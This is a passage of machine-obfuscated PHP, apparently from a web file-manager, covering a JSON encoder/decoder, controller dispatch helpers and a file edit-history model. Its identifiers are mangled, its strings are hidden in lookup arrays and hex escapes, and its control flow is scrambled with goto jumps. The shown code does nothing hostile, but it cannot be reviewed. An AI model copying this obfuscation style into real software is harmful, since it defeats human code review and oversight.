(Services_JSON::isError($Aõ‰Ÿö•ÊÙ)) { return $Aõ‰Ÿö•ÊÙ; } } return $aÑÏ™Š‚¸ò[153] . join($aÑÏ™Š‚¸ò[47], $c‚Ï¢óŠÅ) . $aÑÏ™Š‚¸ò[480]; case $aÑÏ™Š‚¸ò[1907]: $e„Øä™­Ú = get_object_vars($A¾‡²à»¤); $bŸÖÓ”Ö„ = array_map(array($this, $aÑÏ™Š‚¸ò[1905]), array_keys($e„Øä™­Ú), array_values($e„Øä™­Ú)); foreach ($bŸÖÓ”Ö„ as $F•Ş¤¯ï) { if (Services_JSON::isError($F•Ş¤¯ï)) { return $F•Ş¤¯ï; } } return $aÑÏ™Š‚¸ò[1053] . join($aÑÏ™Š‚¸ò[47], $bŸÖÓ”Ö„) . $aÑÏ™Š‚¸ò[311]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $aÑÏ™Š‚¸ò[99] : new Services_JSON_Error(gettype($A¾‡²à»¤) . $aÑÏ™Š‚¸ò[1908]); } } function name_value($BøĞ×éšËï, $bÊİÎÕ‰ã²) { $a¤äŒ²¢© = $this->encode($bÊİÎÕ‰ã²); if (Services_JSON::isError($a¤äŒ²¢©)) { return $a¤äŒ²¢©; } return $this->encode(strval($BøĞ×éšËï)) . $_SERVER[Ä¿Ş°¨][4] . $a¤äŒ²¢©; } function reduce_string($FšªõºÜãê) { $eÌëùª·í =& $_SERVER[Ä¿Ş°¨]; $FšªõºÜãê = preg_replace(array($eÌëùª·í[1909], $eÌëùª·í[1910], $eÌëùª·í[1911]), $eÌëùª·í[33], $FšªõºÜãê); return trim($FšªõºÜãê); } function decode($bêŸµš»Ï©) { $DÁÑ‹µ‰÷Ã =& $_SERVER[Ä¿Ş°¨]; $bêŸµš»Ï© = $this->reduce_string($bêŸµš»Ï©); switch (strtolower($bêŸµš»Ï©)) { case $DÁÑ‹µ‰÷Ã[1558]: return !0; case $DÁÑ‹µ‰÷Ã[1560]: return !1; case $DÁÑ‹µ‰÷Ã[99]: return null; default: $DëÂºÆîËŠ = array(); if (is_numeric($bêŸµš»Ï©)) { return (double) $bêŸµš»Ï© == (int) $bêŸµš»Ï© ? (int) $bêŸµš»Ï© : (double) $bêŸµš»Ï©; } elseif (preg_match($DÁÑ‹µ‰÷Ã[1912], $bêŸµš»Ï©, $DëÂºÆîËŠ) && $DëÂºÆîËŠ[1] == $DëÂºÆîËŠ[2]) { $EòÄí¸ÈºÕ = substr($bêŸµš»Ï©, 0, 1); $B³²ğÙï£Æ = substr($bêŸµš»Ï©, 1, -1); $f†ãÔ÷äÃ = $DÁÑ‹µ‰÷Ã[33]; $B†ªé¯Ø“® = strlen($B³²ğÙï£Æ); for ($fß¤¦ÈîŒ· = 0; $fß¤¦ÈîŒ· < $B†ªé¯Ø“®; ++$fß¤¦ÈîŒ·) { $bé´¸ŸÖÈõ = substr($B³²ğÙï£Æ, $fß¤¦ÈîŒ·, 2); $f½Ç¥ÕŒêè = ord($B³²ğÙï£Æ[$fß¤¦ÈîŒ·]); switch (!0) { case $bé´¸ŸÖÈõ == $DÁÑ‹µ‰÷Ã[1900]: $f†ãÔ÷äÃ .= chr(8); ++$fß¤¦ÈîŒ·; break; case $bé´¸ŸÖÈõ == $DÁÑ‹µ‰÷Ã[1535]: $f†ãÔ÷äÃ .= chr(9); ++$fß¤¦ÈîŒ·; break; case $bé´¸ŸÖÈõ == $DÁÑ‹µ‰÷Ã[1533]: $f†ãÔ÷äÃ .= chr(10); ++$fß¤¦ÈîŒ·; break; case $bé´¸ŸÖÈõ == $DÁÑ‹µ‰÷Ã[1901]: $f†ãÔ÷äÃ .= chr(12); ++$fß¤¦ÈîŒ·; break; case $bé´¸ŸÖÈõ == $DÁÑ‹µ‰÷Ã[1534]: $f†ãÔ÷äÃ .= chr(13); ++$fß¤¦ÈîŒ·; break; case $bé´¸ŸÖÈõ == $DÁÑ‹µ‰÷Ã[1316]: case $bé´¸ŸÖÈõ == $DÁÑ‹µ‰÷Ã[1913]: case $bé´¸ŸÖÈõ == $DÁÑ‹µ‰÷Ã[1528]: case $bé´¸ŸÖÈõ == $DÁÑ‹µ‰÷Ã[1530]: if ($EòÄí¸ÈºÕ == $DÁÑ‹µ‰÷Ã[112] && $bé´¸ŸÖÈõ != $DÁÑ‹µ‰÷Ã[1913] || $EòÄí¸ÈºÕ == $DÁÑ‹µ‰÷Ã[55] && $bé´¸ŸÖÈõ != $DÁÑ‹µ‰÷Ã[1316]) { $f†ãÔ÷äÃ .= $B³²ğÙï£Æ[++$fß¤¦ÈîŒ·]; } break; case preg_match($DÁÑ‹µ‰÷Ã[1914], substr($B³²ğÙï£Æ, $fß¤¦ÈîŒ·, 6)): $f§·’º¥µ = chr(hexdec(substr($B³²ğÙï£Æ, $fß¤¦ÈîŒ· + 2, 2))) . chr(hexdec(substr($B³²ğÙï£Æ, $fß¤¦ÈîŒ· + 4, 2))); $f†ãÔ÷äÃ .= $this->utf162utf8($f§·’º¥µ); $fß¤¦ÈîŒ· += 5; break; case $f½Ç¥ÕŒêè >= 32 && $f½Ç¥ÕŒêè <= 127: $f†ãÔ÷äÃ .= $B³²ğÙï£Æ[$fß¤¦ÈîŒ·]; break; case ($f½Ç¥ÕŒêè & 224) == 192: $f†ãÔ÷äÃ .= substr($B³²ğÙï£Æ, $fß¤¦ÈîŒ·, 2); ++$fß¤¦ÈîŒ·; break; case ($f½Ç¥ÕŒêè & 240) == 224: $f†ãÔ÷äÃ .= substr($B³²ğÙï£Æ, $fß¤¦ÈîŒ·, 3); $fß¤¦ÈîŒ· += 2; break; case ($f½Ç¥ÕŒêè & 248) == 240: $f†ãÔ÷äÃ .= substr($B³²ğÙï£Æ, $fß¤¦ÈîŒ·, 4); $fß¤¦ÈîŒ· += 3; break; case ($f½Ç¥ÕŒêè & 252) == 248: $f†ãÔ÷äÃ .= substr($B³²ğÙï£Æ, $fß¤¦ÈîŒ·, 5); $fß¤¦ÈîŒ· += 4; break; case ($f½Ç¥ÕŒêè & 254) == 252: $f†ãÔ÷äÃ .= substr($B³²ğÙï£Æ, $fß¤¦ÈîŒ·, 6); $fß¤¦ÈîŒ· += 5; break; } } return $f†ãÔ÷äÃ; } elseif (preg_match($DÁÑ‹µ‰÷Ã[1915], $bêŸµš»Ï©) || preg_match($DÁÑ‹µ‰÷Ã[1916], $bêŸµš»Ï©)) { goto B««‹î¶ê; B««‹î¶ê: if ($bêŸµš»Ï©[0] == $DÁÑ‹µ‰÷Ã[153]) { $E¯¹ï´Èâ“ = array(SERVICES_JSON_IN_ARR); $aÜÆ™¾  = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $E¯¹ï´Èâ“ = array(SERVICES_JSON_IN_OBJ); $B¬‡ÙìñÑğ = array(); } else { $E¯¹ï´Èâ“ = array(SERVICES_JSON_IN_OBJ); $B¬‡ÙìñÑğ = new stdClass(); } } array_push($E¯¹ï´Èâ“, array($DÁÑ‹µ‰÷Ã[1917] => SERVICES_JSON_SLICE, $DÁÑ‹µ‰÷Ã[259] => 0, $DÁÑ‹µ‰÷Ã[1918] => !1)); $B³²ğÙï£Æ = substr($bêŸµš»Ï©, 1, -1); goto bæÛ±Ù‚¯; bæÛ±Ù‚¯: $B³²ğÙï£Æ = $this->reduce_string($B³²ğÙï£Æ); if ($B³²ğÙï£Æ == $DÁÑ‹µ‰÷Ã[33]) { if (reset($E¯¹ï´Èâ“) == SERVICES_JSON_IN_ARR) { return $aÜÆ™¾ ; } else { return $B¬‡ÙìñÑğ; } } $B†ªé¯Ø“® = strlen($B³²ğÙï£Æ); goto Aƒ‚„ºõåœ; Aƒ‚„ºõåœ: for ($fß¤¦ÈîŒ· = 0; $fß¤¦ÈîŒ· <= $B†ªé¯Ø“®; ++$fß¤¦ÈîŒ·) { $EÎöÜğ¾À¹ = end($E¯¹ï´Èâ“); $bé´¸ŸÖÈõ = substr($B³²ğÙï£Æ, $fß¤¦ÈîŒ·, 2); if ($fß¤¦ÈîŒ· == $B†ªé¯Ø“® || $B³²ğÙï£Æ[$fß¤¦ÈîŒ·] == $DÁÑ‹µ‰÷Ã[47] && $EÎöÜğ¾À¹[$DÁÑ‹µ‰÷Ã[1917]] == SERVICES_JSON_SLICE) { $fˆ•Å…÷œ = substr($B³²ğÙï£Æ, $EÎöÜğ¾À¹[$DÁÑ‹µ‰÷Ã[259]], $fß¤¦ÈîŒ· - $EÎöÜğ¾À¹[$DÁÑ‹µ‰÷Ã[259]]); array_push($E¯¹ï´Èâ“, array($DÁÑ‹µ‰÷Ã[1917] => SERVICES_JSON_SLICE, $DÁÑ‹µ‰÷Ã[259] => $fß¤¦ÈîŒ· + 1, $DÁÑ‹µ‰÷Ã[1918] => !1)); if (reset($E¯¹ï´Èâ“) == SERVICES_JSON_IN_ARR) { array_push($aÜÆ™¾ , $this->decode($fˆ•Å…÷œ)); } elseif (reset($E¯¹ï´Èâ“) == SERVICES_JSON_IN_OBJ) { $Dø¨±Ùæ·ó = array(); if (preg_match($DÁÑ‹µ‰÷Ã[1919], $fˆ•Å…÷œ, $Dø¨±Ùæ·ó)) { $BÚ´‚‡àò³ = $this->decode($Dø¨±Ùæ·ó[1]); $fŒ”Œ¦Š¼÷ = $this->decode($Dø¨±Ùæ·ó[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $B¬‡ÙìñÑğ[$BÚ´‚‡àò³] = $fŒ”Œ¦Š¼÷; } else { $B¬‡ÙìñÑğ->{$BÚ´‚‡àò³} = $fŒ”Œ¦Š¼÷; } } elseif (preg_match($DÁÑ‹µ‰÷Ã[1920], $fˆ•Å…÷œ, $Dø¨±Ùæ·ó)) { $BÚ´‚‡àò³ = $Dø¨±Ùæ·ó[1]; $fŒ”Œ¦Š¼÷ = $this->decode($Dø¨±Ùæ·ó[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $B¬‡ÙìñÑğ[$BÚ´‚‡àò³] = $fŒ”Œ¦Š¼÷; } else { $B¬‡ÙìñÑğ->{$BÚ´‚‡àò³} = $fŒ”Œ¦Š¼÷; } } } } elseif (($B³²ğÙï£Æ[$fß¤¦ÈîŒ·] == $DÁÑ‹µ‰÷Ã[112] || $B³²ğÙï£Æ[$fß¤¦ÈîŒ·] == $DÁÑ‹µ‰÷Ã[55]) && $EÎöÜğ¾À¹[$DÁÑ‹µ‰÷Ã[1917]] != SERVICES_JSON_IN_STR) { array_push($E¯¹ï´Èâ“, array($DÁÑ‹µ‰÷Ã[1917] => SERVICES_JSON_IN_STR, $DÁÑ‹µ‰÷Ã[259] => $fß¤¦ÈîŒ·, $DÁÑ‹µ‰÷Ã[1918] => $B³²ğÙï£Æ[$fß¤¦ÈîŒ·])); } elseif ($B³²ğÙï£Æ[$fß¤¦ÈîŒ·] == $EÎöÜğ¾À¹[$DÁÑ‹µ‰÷Ã[1918]] && $EÎöÜğ¾À¹[$DÁÑ‹µ‰÷Ã[1917]] == SERVICES_JSON_IN_STR && (strlen(substr($B³²ğÙï£Æ, 0, $fß¤¦ÈîŒ·)) - strlen(rtrim(substr($B³²ğÙï£Æ, 0, $fß¤¦ÈîŒ·), $DÁÑ‹µ‰÷Ã[93]))) % 2 != 1) { array_pop($E¯¹ï´Èâ“); } elseif ($B³²ğÙï£Æ[$fß¤¦ÈîŒ·] == $DÁÑ‹µ‰÷Ã[153] && in_array($EÎöÜğ¾À¹[$DÁÑ‹µ‰÷Ã[1917]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($E¯¹ï´Èâ“, array($DÁÑ‹µ‰÷Ã[1917] => SERVICES_JSON_IN_ARR, $DÁÑ‹µ‰÷Ã[259] => $fß¤¦ÈîŒ·, $DÁÑ‹µ‰÷Ã[1918] => !1)); } elseif ($B³²ğÙï£Æ[$fß¤¦ÈîŒ·] == $DÁÑ‹µ‰÷Ã[480] && $EÎöÜğ¾À¹[$DÁÑ‹µ‰÷Ã[1917]] == SERVICES_JSON_IN_ARR) { array_pop($E¯¹ï´Èâ“); } elseif ($B³²ğÙï£Æ[$fß¤¦ÈîŒ·] == $DÁÑ‹µ‰÷Ã[1053] && in_array($EÎöÜğ¾À¹[$DÁÑ‹µ‰÷Ã[1917]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($E¯¹ï´Èâ“, array($DÁÑ‹µ‰÷Ã[1917] => SERVICES_JSON_IN_OBJ, $DÁÑ‹µ‰÷Ã[259] => $fß¤¦ÈîŒ·, $DÁÑ‹µ‰÷Ã[1918] => !1)); } elseif ($B³²ğÙï£Æ[$fß¤¦ÈîŒ·] == $DÁÑ‹µ‰÷Ã[311] && $EÎöÜğ¾À¹[$DÁÑ‹µ‰÷Ã[1917]] == SERVICES_JSON_IN_OBJ) { array_pop($E¯¹ï´Èâ“); } elseif ($bé´¸ŸÖÈõ == $DÁÑ‹µ‰÷Ã[1921] && in_array($EÎöÜğ¾À¹[$DÁÑ‹µ‰÷Ã[1917]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($E¯¹ï´Èâ“, array($DÁÑ‹µ‰÷Ã[1917] => SERVICES_JSON_IN_CMT, $DÁÑ‹µ‰÷Ã[259] => $fß¤¦ÈîŒ·, $DÁÑ‹µ‰÷Ã[1918] => !1)); $fß¤¦ÈîŒ·++; } elseif ($bé´¸ŸÖÈõ == $DÁÑ‹µ‰÷Ã[1922] && $EÎöÜğ¾À¹[$DÁÑ‹µ‰÷Ã[1917]] == SERVICES_JSON_IN_CMT) { array_pop($E¯¹ï´Èâ“); $fß¤¦ÈîŒ·++; for ($CñÁÛßš½ê = $EÎöÜğ¾À¹[$DÁÑ‹µ‰÷Ã[259]]; $CñÁÛßš½ê <= $fß¤¦ÈîŒ·; ++$CñÁÛßš½ê) { $B³²ğÙï£Æ = substr_replace($B³²ğÙï£Æ, $DÁÑ‹µ‰÷Ã[50], $CñÁÛßš½ê, 1); } } } if (reset($E¯¹ï´Èâ“) == SERVICES_JSON_IN_ARR) { return $aÜÆ™¾ ; } elseif (reset($E¯¹ï´Èâ“) == SERVICES_JSON_IN_OBJ) { return $B¬‡ÙìñÑğ; } goto BÃóçôÑ; BÃóçôÑ: } } } function isError($CâÕÒ‰ØÏ•, $A„™ ÆÜ¶ = null) { $fè˜˜ñíå° =& $_SERVER[Ä¿Ş°¨]; if (class_exists($fè˜˜ñíå°[1923])) { return PEAR::isError($CâÕÒ‰ØÏ•, $A„™ ÆÜ¶); } elseif (is_object($CâÕÒ‰ØÏ•) && (get_class($CâÕÒ‰ØÏ•) == $fè˜˜ñíå°[1924] || is_subclass_of($CâÕÒ‰ØÏ•, $fè˜˜ñíå°[1924]))) { return !0; } return !1; } } if (class_exists($_SERVER[Ä¿Ş°¨][1925])) { class Services_JSON_Error extends PEAR_Error { function __construct($B‚„ÊÖ«àÄ = "\x75\156\x6b\x6e\157\167\156\40\145\162\162\157\162", $CÅïÔÎ‚„ß = null, $Eï¹ß†ôƒ£ = null, $b¯Ã–¸Âäñ = null, $DáÃñ®·˜¾ = null) { parent::PEAR_Error($B‚„ÊÖ«àÄ, $CÅïÔÎ‚„ß, $Eï¹ß†ôƒ£, $b¯Ã–¸Âäñ, $DáÃñ®·˜¾); } } } else { class Services_JSON_Error { function __construct($BÒĞ·øàÃÂ = "\x75\x6e\153\156\157\x77\156\40\145\162\x72\x6f\x72", $a–ğ‡èËîÌ = null, $A›„ßš¡Óˆ = null, $e£ß°Ê»ìÏ = null, $c‘‚©İ—¢õ = null) { } } } goto a´ê‡®ËÖœ; b¤Şùïõà: function Action($a˜ŠÁˆİí = '') { goto a¢­×ñ‘ö; b½˜ºğ–ò: if (isset($F²àÃĞš¢õ[$cÄ…º™Ò«Ø])) { return $F²àÃĞš¢õ[$cÄ…º™Ò«Ø]; } if (is_file($eƒ°Æààí“)) { include_once $eƒ°Æààí“; } if (!class_exists($cÒÙÃî¼´£)) { return actionCallError("\133{$a˜ŠÁˆİí}\40\75\x3e\40{$cÒÙÃî¼´£}\135\40\143\x6c\141\x73\x73\x20\156\x6f\164\x20\145\x78\x69\163\x74\163\x21"); } goto aƒĞÜƒÂõ”; F‚ã’œÇ–ô: if (isset($F²àÃĞš¢õ[$CÈÙŞÕ¶â])) { return $F²àÃĞš¢õ[$CÈÙŞÕ¶â]; } $a˜ŠÁˆİí = trim(str_replace($b ‹†ß¡Øí[4], $b ‹†ß¡Øí[5], $a˜ŠÁˆİí), $b ‹†ß¡Øí[4]); $fŠµ´·Ğ¨¯ = explode($b ‹†ß¡Øí[5], $a˜ŠÁˆİí); goto cİµÜ¥à‘Ø; aƒĞÜƒÂõ”: $F²àÃĞš¢õ[$cÄ…º™Ò«Ø] = new $cÒÙÃî¼´£(); $F²àÃĞš¢õ[$CÈÙŞÕ¶â] = $F²àÃĞš¢õ[$cÄ…º™Ò«Ø]; return $F²àÃĞš¢õ[$cÄ…º™Ò«Ø]; goto fğÙÓó…ŒÖ; a¢­×ñ‘ö: $b ‹†ß¡Øí =& $_SERVER[£›Åú§µ]; static $F²àÃĞš¢õ = array(); $CÈÙŞÕ¶â = $a˜ŠÁˆİí; goto F‚ã’œÇ–ô; cİµÜ¥à‘Ø: $A¤Ò­¦éµ = strtolower($fŠµ´·Ğ¨¯[0]); if (substr($A¤Ò­¦éµ, -6) == $b ‹†ß¡Øí[6]) { $a˜ŠÁˆİí = substr($fŠµ´·Ğ¨¯[0], 0, -6); $cÒÙÃî¼´£ = $a˜ŠÁˆİí . $b ‹†ß¡Øí[7]; $eƒ°Æààí“ = $b ‹†ß¡Øí[8]; if (isset($fŠµ´·Ğ¨¯[1]) && substr(strtolower($fŠµ´·Ğ¨¯[1]), -5) == $b ‹†ß¡Øí[9]) { $cÒÙÃî¼´£ = $a˜ŠÁˆİí . $fŠµ´·Ğ¨¯[1]; $eƒ°Æààí“ = $b ‹†ß¡Øí[10] . $fŠµ´·Ğ¨¯[1] . $b ‹†ß¡Øí[11]; } else { if (count($fŠµ´·Ğ¨¯) == 3) { $cÒÙÃî¼´£ = $a˜ŠÁˆİí . $fŠµ´·Ğ¨¯[1] . $fŠµ´·Ğ¨¯[2]; $eƒ°Æààí“ = $b ‹†ß¡Øí[12] . $fŠµ´·Ğ¨¯[1] . $b ‹†ß¡Øí[13] . $fŠµ´·Ğ¨¯[2] . $b ‹†ß¡Øí[11]; } } $eƒ°Æààí“ = PLUGIN_DIR . $a˜ŠÁˆİí . $b ‹†ß¡Øí[4] . $eƒ°Æààí“; } else { if (substr($A¤Ò­¦éµ, -5) == $b ‹†ß¡Øí[9]) { $a˜ŠÁˆİí = substr($fŠµ´·Ğ¨¯[0], 0, -5); return Model($a˜ŠÁˆİí); } else { $cÒÙÃî¼´£ = $fŠµ´·Ğ¨¯[0] . $fŠµ´·Ğ¨¯[1]; $eƒ°Æààí“ = CONTROLLER_DIR . $fŠµ´·Ğ¨¯[0] . $b ‹†ß¡Øí[4] . $fŠµ´·Ğ¨¯[1] . $b ‹†ß¡Øí[14]; } } $cÄ…º™Ò«Ø = strtolower($cÒÙÃî¼´£); goto b½˜ºğ–ò; fğÙÓó…ŒÖ: } function ActionApply($fªˆòä³öà, $F‹…ÆÏ”ƒò = array()) { goto e‡‘ğĞÛğÉ; fˆÔŠ¨õÖ‹: if (!method_exists($d„Ô‰Ñ£óÚ, $c×¢öÔœ)) { return actionCallError("{$fªˆòä³öà}\x20\155\145\x74\150\157\144\x20\156\x6f\x74\x20\145\170\x69\163\164\163\x21"); } $a¼Éœ–„ = call_user_func_array(array($d„Ô‰Ñ£óÚ, $c×¢öÔœ), $F‹…ÆÏ”ƒò); return $a¼Éœ–„; goto CÑÓ‹¿ò¹¬; e‡‘ğĞÛğÉ: if (is_array($fªˆòä³öà)) { return call_user_func_array($fªˆòä³öà, $F‹…ÆÏ”ƒò); } if (function_exists($fªˆòä³öà)) { return call_user_func_array($fªˆòä³öà, $F‹…ÆÏ”ƒò); } $e¤”¾±‹ = strrpos($fªˆòä³öà, $_SERVER[£›Åú§µ][5]); goto CÎÈ…ìº±; CÎÈ…ìº±: $Eµ«®¥Â—° = substr($fªˆòä³öà, 0, $e¤”¾±‹); $c×¢öÔœ = substr($fªˆòä³öà, $e¤”¾±‹ + 1); $d„Ô‰Ñ£óÚ = Action($Eµ«®¥Â—°); goto fˆÔŠ¨õÖ‹; CÑÓ‹¿ò¹¬: } function actionCallError($d‰ÜœŒÎóæ) { $e½Û¡Ğ‡‘ä =& $_SERVER[£›Åú§µ]; $a…”‡•ˆêÒ = json_encode_force(array($e½Û¡Ğ‡‘ä[15] => this_url(), $e½Û¡Ğ‡‘ä[16] => $GLOBALS[$e½Û¡Ğ‡‘ä[16]])); $a…”‡•ˆêÒ = str_replace(array($e½Û¡Ğ‡‘ä[17]), array($e½Û¡Ğ‡‘ä[4]), $a…”‡•ˆêÒ); return write_log($d‰ÜœŒÎóæ . $e½Û¡Ğ‡‘ä[18] . $a…”‡•ˆêÒ, $e½Û¡Ğ‡‘ä[19]); } goto eÄŸ³œ³ôš; dùË®ˆÎ: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\162\143\x65\137\x68\x69\x73\x74\157\x72\x79"; public function addHistory($BÄ×İêäğ’, $A ‡°ß¹Ğ = '') { $d‡’¥áäŞ¨ =& $_SERVER[Ä¿Ş°¨]; $eö§—¬¬ø‹ = array($d‡’¥áäŞ¨[388] => $BÄ×İêäğ’[$d‡’¥áäŞ¨[374]], $d‡’¥áäŞ¨[1390] => isset($BÄ×İêäğ’[$d‡’¥áäŞ¨[384]]) ? $BÄ×İêäğ’[$d‡’¥áäŞ¨[384]] : $BÄ×İêäğ’[$d‡’¥áäŞ¨[383]], $d‡’¥áäŞ¨[424] => $BÄ×İêäğ’[$d‡’¥áäŞ¨[423]], $d‡’¥áäŞ¨[524] => $BÄ×İêäğ’[$d‡’¥áäŞ¨[77]], $d‡’¥áäŞ¨[2248] => $A ‡°ß¹Ğ); $DÌ’ÎÖ«ïè = $GLOBALS[$d‡’¥áäŞ¨[6]][$d‡’¥áäŞ¨[84]][$d‡’¥áäŞ¨[2249]]; if ($DÌ’ÎÖ«ïè > 1) { $this->historyAutoClear($eö§—¬¬ø‹[$d‡’¥áäŞ¨[374]]); $this->add($eö§—¬¬ø‹); } Model($d‡’¥áäŞ¨[2250])->eventFileEdit($BÄ×İêäğ’[$d‡’¥áäŞ¨[374]]); } private function historyAutoClear($E´Ş»Ş÷¸ğ) { goto Bò½„¬—Ò“; dõòÎªÀ˜Â: if ($AºÍ¿£Óâ >= 500) { return; } $a›Í‹¼àÂï = array($B‘íóÒ®ÄØ[388] => $E´Ş»Ş÷¸ğ); $AùÅš”ßÖ· = $this->field($B‘íóÒ®ÄØ[2253])->where($a›Í‹¼àÂï)->order($B‘íóÒ®ÄØ[2245])->select(); goto F¹ª¸Ä¯Ü÷; EÄÇ„õïŸ˜: $Eä®”ÖÒŸ‘ = array_to_keyvalue($AùÅš”ßÖ·, $B‘íóÒ®ÄØ[33], $B‘íóÒ®ÄØ[423]); $Eä®”ÖÒŸ‘ = array_slice($Eä®”ÖÒŸ‘, $AºÍ¿£Óâ); if (!$D¶“Â×øù || !$Eä®”ÖÒŸ‘) { return; } goto e­…àÎ¯ßµ; e­…àÎ¯ßµ: $a›Í‹¼àÂï = array($B‘íóÒ®ÄØ[390] => array($B‘íóÒ®ÄØ[7], $D¶“Â×øù)); $this->where($a›Í‹¼àÂï)->delete(); Model($B‘íóÒ®ÄØ[426])->remove($Eä®”ÖÒŸ‘); goto Bø¸–š²¢‡; Bò½„¬—Ò“: $B‘íóÒ®ÄØ =& $_SERVER[Ä¿Ş°¨]; $D´¹¬ßó‘× = Model($B‘íóÒ®ÄØ[1073])->get($B‘íóÒ®ÄØ[2251]); $F½âˆŒ”İŞ = $GLOBALS[$B‘íóÒ®ÄØ[6]][$B‘íóÒ®ÄØ[84]][$B‘íóÒ®ÄØ[2249]]; goto c¿íÊ“¿Œ÷; F¹ª¸Ä¯Ü÷: if (!$AùÅš”ßÖ· || $AºÍ¿£Óâ >= count($AùÅš”ßÖ·)) { return; } $D¶“Â×øù = array_to_keyvalue($AùÅš”ßÖ·, $B‘íóÒ®ÄØ[33], $B‘íóÒ®ÄØ[372]); $D¶“Â×øù = array_slice($D¶“Â×øù, $AºÍ¿£Óâ); goto EÄÇ„õïŸ˜; c¿íÊ“¿Œ÷: $a‹”Ëğ·óÑ = $D´¹¬ßó‘× == $B‘íóÒ®ÄØ[2252] ? 3 : $F½âˆŒ”İŞ; if ($F½âˆŒ”İŞ <= 1) { $a‹”Ëğ·óÑ = 1; } $AºÍ¿£Óâ = $a‹”Ëğ·óÑ - 1; goto dõòÎªÀ˜Â; Bø¸–š²¢‡: } public function listData($FŠâ‹ÚÍöË) { goto dµŒ¦†£ì; f¼ğóÊââ: $dì›¥Íã‚¶ = 3; if ($E“Ìçä±òÙ == $E»Ö“‚Æ[2252]) { $EŞÅğäêœ[$E»Ö“‚Æ[350]] = array_slice($EŞÅğäêœ[$E»Ö“‚Æ[350]], 0, $dì›¥Íã‚¶); $EŞÅğäêœ[$E»Ö“‚Æ[347]] = array($E»Ö“‚Æ[2255] => 1, $E»Ö“‚Æ[2256] => 20, $E»Ö“‚Æ[2257] => 1, $E»Ö“‚Æ[2258] => count($EŞÅğäêœ[$E»Ö“‚Æ[350]])); } return $EŞÅğäêœ; goto C„¿éÂÎ÷Ë; a¿ùÈåÂÓÚ: $EŞÅğäêœ = $this->field($B¸‚ÂÂà£¯)->where($EÆ‰¤ñè‰ë)->order($E»Ö“‚Æ[2245])->selectPage(); $this->_listAppendUser($EŞÅğäêœ[$E»Ö“‚Æ[350]]); $E“Ìçä±òÙ = Model($E»Ö“‚Æ[1073])->get($E»Ö“‚Æ[2251]); goto f¼ğóÊââ; dµŒ¦†£ì: $E»Ö“‚Æ =& $_SERVER[Ä¿Ş°¨]; $EÆ‰¤ñè‰ë = array($E»Ö“‚Æ[388] => $FŠâ‹ÚÍöË); $B¸‚ÂÂà£¯ = $E»Ö“‚Æ[2254]; goto a¿ùÈåÂÓÚ; C„¿éÂÎ÷Ë: } protected function _listAppendUser(&$cÏƒöõ•) { $a¸ùÄô÷ìª =& $_SERVER[Ä¿Ş°¨]; $B¯Í‘›ô„ = array_to_keyvalue($cÏƒöõ•, $a¸ùÄô÷ìª[33], $a¸ùÄô÷ìª[1399]); $b©ğ¹‰Š± = Model($a¸ùÄô÷ìª[481])->userListInfo($B¯Í‘›ô„); foreach ($cÏƒöõ• as &$F”Êƒèãˆƒ) { $Fù³Ç¤Êø = $F”Êƒèãˆƒ[$a¸ùÄô÷ìª[1399]]; $F”Êƒèãˆƒ[$a¸ùÄô÷ìª[383]] = $b©ğ¹‰Š±[$Fù³Ç¤Êø] ? $b©ğ¹‰Š±[$Fù³Ç¤Êø] : !1; } } public function fileInfo($A¼´£‡öÀ) { $AÁ†‡ä¯Ï =& $_SERVER[Ä¿Ş°¨]; $b´Ã‡†µ§ = $this->tablePrefix; $AÔŠ±¸ÎŒ = "{$b´Ã‡†µ§}\x69\157\137\x66\x69\154\x65\40\146\151\154\x65\x73\40\x6f\156\x20\146\151\x6c\145\x73\56\x66\x69\154\145\x49\104\40\75\40\150\x69\x73\x74\157\162\x79\56\146\151\154\145\x49\x44"; return $this->alias($AÁ†‡ä¯Ï[2259])->where(array($AÁ†‡ä¯Ï[390] => $A¼´£‡öÀ))->join($AÔŠ±¸ÎŒ, $AÁ†‡ä¯Ï[2260])->find(); } public function removeItem($cå†ªµÓ×ì) { $Eâ£ªãõˆ =& $_SERVER[Ä¿Ş°¨]; $F¡ò¶é¤é = array($Eâ£ªãõˆ[390] => $cå†ªµÓ×ì); $cà™¢ƒí¥ë = $this->where($F¡ò¶é¤é)->find(); if ($cà™¢ƒí¥ë) { $BÌÃçÛ‚•Ñ = $this->where($F¡ò¶é¤é)->delete(); Model($Eâ£ªãõˆ[426])->remove($cà™¢ƒí¥ë[$Eâ£ªãõˆ[423]]); return $BÌÃçÛ‚•Ñ; } return !1; } public function removeBySource($cî’§“øïñ) { goto fó»öÌÄø”; fó»öÌÄø”: $dŞÇ¨·Òë¾ =& $_SERVER[Ä¿Ş°¨]; if (!$cî’§“øïñ) { return !1; } if (!is_array($cî’§“øïñ)) { $cî’§“øïñ = array($cî’§“øïñ); } goto a¯˜Ù¬†Š; e°ˆœˆ‰¹¶: return !0; goto b¬Ÿ“°í; a¯˜Ù¬†Š: $döƒîŞ£åÊ = array($dŞÇ¨·Òë¾[388] => array($dŞÇ¨·Òë¾[7], $cî’§“øïñ)); $fçÁ¯Éî = $this->field($dŞÇ¨·Òë¾[424])->where($döƒîŞ£åÊ)->select(); if ($fçÁ¯Éî) { $this->where($döƒîŞ£åÊ)->delete(); $b…­õªœÚ› = array_to_keyvalue($fçÁ¯Éî, $dŞÇ¨·Òë¾[33], $dŞÇ¨·Òë¾[423]); Model($dŞÇ¨·Òë¾[426])->remove($b…­õªœÚ›); } goto e°ˆœˆ‰¹¶; b¬Ÿ“°í: } public function setDetail($bâ…ªÔ­ÌÊ, $c¸ùáÉ«øÉ) { $a£¼ÈÊÍ¿˜ =& $_SERVER[Ä¿Ş°¨]; return $this->where(array($a£¼ÈÊÍ¿˜[390] => $bâ…ªÔ­ÌÊ))->save(array($a£¼ÈÊÍ¿˜[2248] => $c¸ùáÉ«øÉ)); } public function rollbackToItem($F’—î¡ˆÏÒ, $DĞ‚ÄÈÖÓœ) { goto bÁŠâä­ÚÂ; bÁŠâä­ÚÂ: 